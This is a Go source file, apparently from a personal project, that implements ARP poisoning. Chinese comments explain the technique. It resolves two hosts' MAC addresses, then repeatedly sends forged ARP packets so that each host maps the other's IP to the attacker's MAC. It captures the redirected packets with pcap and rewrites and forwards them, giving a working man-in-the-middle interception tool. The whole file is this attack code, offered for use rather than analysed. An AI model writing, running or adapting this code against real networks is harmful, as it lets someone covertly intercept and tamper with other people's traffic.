package arppoisoning

import (
	"net"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket"
	"time"
	"fmt"
	"encoding/hex"
	"bytes"
	"errors"
	"encoding/binary"
	"github.com/gotips/log"
	"sync"
)

var (
	handleMutex sync.Mutex = sync.Mutex{}
)
/*
简单的说，ARP 就是广播查询某个 IP 对应的 MAC 地址，在用这个 IP 的人回个声。
知道这个 IP 对应的 MAC 地址，就可以链路通信了（链路层只能通过MAC地址通信）。
如果有人冒充回复，并抢在正常人之前，伪造的答案也就先入为主。
IP 被解析到错误的地址上，之后所有的通信都被劫持了。
 */

/*
将截获ip1和ip2之间通信的所有流量，自己相当于是一个中间人的角色,
close(stop) or write somthing to stop when you want to stop
 */
func ArpPoisoning(interfaceName string, myip, ip1, ip2 net.IP, mymac, mac1, mac2 net.HardwareAddr, stop chan bool) {
	/*
	第一步，不停的像ip1和ip2伪造mac地址，让他们将ip数据包都转发给我自己
	第二步，将收到的ip数据报中地址是ip1和ip2的数据包回复为真实的mac地址
	 */
	shouldStop := false
	go sendSudeoArpInfo(interfaceName, myip, ip1, ip2, mymac, mac1, mac2, &shouldStop)

	handle, err := pcap.OpenLive(interfaceName, 65535, true, 100 * time.Millisecond)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()
	var filter string = fmt.Sprintf("ip host %s or ip host %s ", ip1.To4().String(), ip2.To4().String())
	err = handle.SetBPFFilter(filter)
	if err != nil {
		log.Fatal(err)
		return
	}
	log.Infof("capture filter: ip host %s or ip host %s ", ip1.To4().String(), ip2.To4().String())
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	ip2Mac := make(map[string]net.HardwareAddr)
	ip2Mac[ip1.String()] = mac1
	ip2Mac[ip2.String()] = mac2
	in := packetSource.Packets()

	var packet gopacket.Packet
	for {
		select {
		case <-stop:
			shouldStop = true
			time.Sleep(3 * time.Second) //多等一会儿，让arp发送线程有机会结束
			return
		case packet = <-in:
			layer := packet.Layer(layers.LayerTypeEthernet)
			log.Debug("receive a packet")
			if layer != nil {
				ethLayer := layer.(*layers.Ethernet)
				if bytes.Compare(ethLayer.DstMAC, mymac) == 0 {
					layer = packet.Layer(layers.LayerTypeIPv4)
					if layer != nil {
						iplayer := layer.(*layers.IPv4)
						//目标mac是我，并且ip地址是我要监听的两个，那么转发
						if ( (ipEqual(iplayer.DstIP, ip1) && ipEqual(iplayer.SrcIP, ip2)  ) ||
						( ipEqual(iplayer.DstIP, ip2) && ipEqual(iplayer.SrcIP, ip1) )) {
							log.Debug("receive a  valid packet...")
							raw := PacketHandler(packet, ip2Mac)
							//handleMutex.Lock()
							err := handle.WritePacketData(raw)
							log.Debug("resend this packet..")
							//handleMutex.Unlock()
							if err != nil {
								log.Error(err)
								return
							}

						}
					}
				}

			}
		}
	}

}
func PacketHandler(packet gopacket.Packet, ip2Mac map[string]net.HardwareAddr) []byte {
	data := packet.Data()
	//fmt.Println(packet.String())
	//fmt.Println("data len:",len(data))
	layer := packet.Layer(layers.LayerTypeIPv4)
	iplayer := layer.(*layers.IPv4)
	layer = packet.Layer(layers.LayerTypeEthernet)
	ethLayer := layer.(*layers.Ethernet)
	dstMac := ip2Mac[iplayer.DstIP.String()]
	//copy(data,dstMac)
	for i := 0; i < len(dstMac); i++ {
		data[i] = dstMac[i]
	}
	return data
	buffer := gopacket.NewSerializeBuffer()
	ethLayer.DstMAC = ip2Mac[iplayer.DstIP.String()]
	layers := packet.Layers()
	gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{},
		toSerializableLayer(layers)...
	)
	outgoingPacket := buffer.Bytes()
	// Send our packet
	log.Debug("after:")
	log.Debug(hex.Dump(outgoingPacket))
	return outgoingPacket

}
func toSerializableLayer(ls []gopacket.Layer) []gopacket.SerializableLayer {
	outls := make([]gopacket.SerializableLayer, 0, len(ls))
	for _, l := range ls {
		outl := l.(gopacket.SerializableLayer)
		if outl == nil {
			fmt.Printf("%s is not seriable\n", outl)
			continue
		}
		outls = append(outls, outl)
	}
	return outls

}
//return true if ip1 equal ip2
func ipEqual(ip1, ip2 net.IP) bool {
	if bytes.Compare(ip1.To4(), ip2.To4()) == 0 {
		return true
	} else {
		return false
	}
}

//tell ip1 that ip2's mac is mymac and tell ip2 that ip1's mac is mymac periodly
func sendSudeoArpInfo(interfaceName string, myip, ip1, ip2 net.IP, mymac, mac1, mac2 net.HardwareAddr, shouldStop *bool) {
	fmt.Printf("start sending fake arp packets...\n")
	handle, err := pcap.OpenLive(interfaceName, 65535, false, pcap.BlockForever)
	handle.SetDirection(pcap.DirectionOut)
	defer handle.Close()
	if err != nil {
		log.Fatal(err)
	}
	for ! (*shouldStop) {
		//tell ip1 that ip2's mac is mymac
		SendAFakeArpRequest(handle, ip1, ip2, mac1, mymac)
		//tell ip2 that ip1's mac is mymac
		SendAFakeArpRequest(handle, ip2, ip1, mac2, mymac)
		time.Sleep(1 * time.Second)

	}

}
//send a arp reply from srcIp to dstIP
func SendAFakeArpReply(handle *pcap.Handle, dstIP, srcIP net.IP, dstMac, srcMac net.HardwareAddr) {

	arpLayer := &layers.ARP{
		AddrType:layers.LinkTypeEthernet,
		Protocol:layers.EthernetTypeIPv4,
		HwAddressSize:6,
		ProtAddressSize:4,
		Operation:2,
	}
	arpLayer.DstHwAddress = dstMac
	arpLayer.DstProtAddress = []byte(dstIP.To4())
	arpLayer.SourceHwAddress = srcMac
	arpLayer.SourceProtAddress = []byte(srcIP.To4())

	ethernetLayer := &layers.Ethernet{
		SrcMAC: srcMac,
		DstMAC: dstMac,
	}
	ethernetLayer.EthernetType = layers.EthernetTypeARP
	// And create the packet with the layers
	buffer := gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{},
		ethernetLayer,
		arpLayer,
	)
	outgoingPacket := buffer.Bytes()
	//fmt.Println(hex.Dump(outgoingPacket))
	handle.WritePacketData(outgoingPacket)
}
//send a arp reply from srcIp to dstIP
func SendAFakeArpRequest(handle *pcap.Handle, dstIP, srcIP net.IP, dstMac, srcMac net.HardwareAddr) {

	arpLayer := &layers.ARP{
		AddrType:layers.LinkTypeEthernet,
		Protocol:layers.EthernetTypeIPv4,
		HwAddressSize:6,
		ProtAddressSize:4,
		Operation:layers.ARPRequest,
		DstHwAddress:dstMac,
		DstProtAddress:[]byte(dstIP.To4()),
		SourceHwAddress:srcMac,
		SourceProtAddress:[]byte(srcIP.To4()),
	}

	ethernetLayer := &layers.Ethernet{
		SrcMAC: srcMac,
		DstMAC: dstMac,
		EthernetType:layers.EthernetTypeARP,
	}

	// And create the packet with the layers
	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:true,
		ComputeChecksums:true,
	}
	err := gopacket.SerializeLayers(buffer, opts,
		ethernetLayer,
		arpLayer,
	)
	if err != nil {
		log.Error(err)
	}
	outgoingPacket := buffer.Bytes()
	log.Debug("sending arp")
	//log.Debug(hex.Dump(outgoingPacket))
	handleMutex.Lock()
	err = handle.WritePacketData(outgoingPacket)
	handleMutex.Unlock()
	if err != nil {
		log.Error(err)
	}
}

// readARP watches a handle for incoming ARP responses we might care about, and prints them.
//
// readARP loops until 'stop' is closed.
func readARP(handle *pcap.Handle, mymac net.HardwareAddr, stop chan bool, macs map[string]net.HardwareAddr) {
	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	in := src.Packets()
	for {
		var packet gopacket.Packet
		select {
		case <-stop:
			return
		case packet = <-in:
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			arp := arpLayer.(*layers.ARP)
			if arp.Operation != layers.ARPReply || bytes.Equal([]byte(mymac), arp.SourceHwAddress) {
				// This is a packet I sent.
				continue
			}
		// Note:  we might get some packets here that aren't responses to ones we've sent,
		// if for example someone else sends US an ARP request.  Doesn't much matter, though...
		// all information is good information :)
			log.Debugf("IP %v is at %v", net.IP(arp.SourceProtAddress), net.HardwareAddr(arp.SourceHwAddress))
			macs[net.IP(arp.SourceProtAddress).To4().String()] = arp.SourceHwAddress
		}
	}
}


//获取指定ip对应的mac地址
func getMacsFromArpWithIp(interfaceName string, ips []net.IP, myip net.IP, mymac net.HardwareAddr) (map[string]net.HardwareAddr, error) {
	stop := make(chan bool)
	macs := make(map[string]net.HardwareAddr)
	handle, err := pcap.OpenLive(interfaceName, 65535, false, 100 * time.Millisecond)
	if err != nil {
		log.Fatal(err)
		return nil, err
	}
	defer handle.Close()
	log.Debug(handle)
	go readARP(handle, mymac, stop, macs)
	//send arp request twice for each ip
	for i := 0; i < 2; i++ {
		for _, ip := range ips {
			SendAFakeArpRequest(handle, ip, myip, broadcastMac, mymac)
		}
	}
	//wait for all arp reply
	time.Sleep(3 * time.Second)
	close(stop)
	log.Debug(macs)
	//if not get all mac, print error
	for _, ip := range ips {
		if macs[ip.To4().String()] == nil {
			return nil, fmt.Errorf("%s mac not found", ip.To4().String())
		}
	}
	return macs, nil
}
//ip is the same network with net
func IsTheSameNetwork(ip net.IP, net pcap.InterfaceAddress) bool {
	val := binary.BigEndian.Uint32(ip.To4())
	netIp := binary.BigEndian.Uint32(net.IP.To4())
	mask := binary.BigEndian.Uint32(net.Netmask)
	return val & mask == netIp & mask
}

//find a interface who's subnetwork is the same as ip
func FindInterfaceWithIp(ip net.IP) (interfaceName string, address pcap.InterfaceAddress, err error) {
	err = nil
	interfaceName = ""
	address = pcap.InterfaceAddress{}
	ifaces, err := pcap.FindAllDevs()
	if err != nil {
		return
	}

	for _, iface := range ifaces {
		addrs := iface.Addresses
		for _, a := range addrs {
			if ip4 := a.IP.To4(); ip4 != nil {
				if IsTheSameNetwork(ip, a) {
					log.Debugf("find ip:%s,on %s", ip, iface.Name)
					interfaceName = iface.Name
					address = a
					return
				}
			}
		}

	}
	err = errors.New("not found  interface")
	return
}
//find a interface who's subnetwork is the same as ip1 and ip2
func FindHandleWithIp2(ip1, ip2 net.IP) (handle *pcap.Handle, err error) {
	ifaces, err := pcap.FindAllDevs()
	if err != nil {
		return nil, err
	}

	for _, iface := range ifaces {
		addrs := iface.Addresses
		for _, a := range addrs {
			if ip4 := a.IP.To4(); ip4 != nil {
				if IsTheSameNetwork(ip1, a) && IsTheSameNetwork(ip2, a) {
					handle, err := pcap.OpenLive(iface.Name, 65535, false, 300 * time.Millisecond)
					return handle, err
				}
			}
		}

	}
	return nil, errors.New("not found  interface")
}
//获取本地ip地址对应的mac地址
func GetMyMacFromIp(ip net.IP) (hwaddr net.HardwareAddr, err error) {
	hwaddr = net.HardwareAddr{}
	err = nil
	ifaces, err := net.Interfaces()
	if err != nil {
		panic(err)
	}
	for _, iface := range ifaces {
		if addrs, err := iface.Addrs(); err != nil {
			return hwaddr, err
		} else {
			for _, a := range addrs {
				if ipnet, ok := a.(*net.IPNet); ok {
					if bytes.Equal(ipnet.IP.To4(), ip.To4()) {
						hwaddr = iface.HardwareAddr
						if len(iface.HardwareAddr) != 6 {
							//网卡地址有可能是8字节？
							hwaddr = iface.HardwareAddr[:6]
						}
						return hwaddr, nil
					}
				}
			}
		}
	}

	return net.HardwareAddr{}, errors.New("no such ip")

}
func ArpPoisoningWithIP(ip1, ip2 net.IP, stop chan bool) error {
	log.Debug("start ...")
	interfaceName, address, err := FindInterfaceWithIp(ip1)
	if err != nil {
		return err
	}
	log.Debug("return")
	if !IsTheSameNetwork(ip2, address) {
		return errors.New("ip1 and ip2 is not in the same network")
	}
	myip := address.IP
	mymac, err := GetMyMacFromIp(myip)
	if len(mymac) != 4 {

	}
	log.Info("mymac:", mymac, myip)
	if err != nil {
		return err
	}

	macs, err := getMacsFromArpWithIp(interfaceName, []net.IP{ip1, ip2}, myip, mymac)
	if err != nil {
		return err
	}
	log.Infof("%s mac:%s,%s mac:%s", ip1, macs[ip1.To4().String()], ip2, macs[ip2.To4().String()])
	log.Debugf("local ip is:%s,local mac:%s\n", myip, mymac)
	ArpPoisoning(interfaceName, myip, ip1, ip2, mymac, macs[ip1.To4().String()], macs[ip2.To4().String()], stop)
	log.Info("stop poisoning...")
	return nil
}
func init() {
	//fmt.Println(ip1,ip2,myip)
}

func getAHandle() *pcap.Handle {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}

	// Print device information
	fmt.Println("Devices found:")
	for i, device := range devices {
		fmt.Println("\nindex:", i)
		fmt.Println("Name: ", device.Name)
		fmt.Println("Description: ", device.Description)
		fmt.Println("Devices addresses: ", device.Description)
		for _, address := range device.Addresses {
			fmt.Println("- IP address: ", address.IP)
			fmt.Println("- Subnet mask: ", address.Netmask)
		}
	}
	var index = 0
	fmt.Printf("select a device:")
	fmt.Scanf("%d", &index)
	fmt.Printf("you select %d:%s\n", index, devices[index].Name)
	handle, err := pcap.OpenLive(devices[index].Name, 65536, false, 300 * time.Millisecond)
	if err != nil {
		log.Fatal(err)
	}
	return handle
}
func getFileHandle() *pcap.Handle {
	handle, err := pcap.OpenOffline("arpicmp.pcap")

	if err != nil {
		log.Fatal(err)
	}
	return handle
}

var (
	broadcastMac = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
)

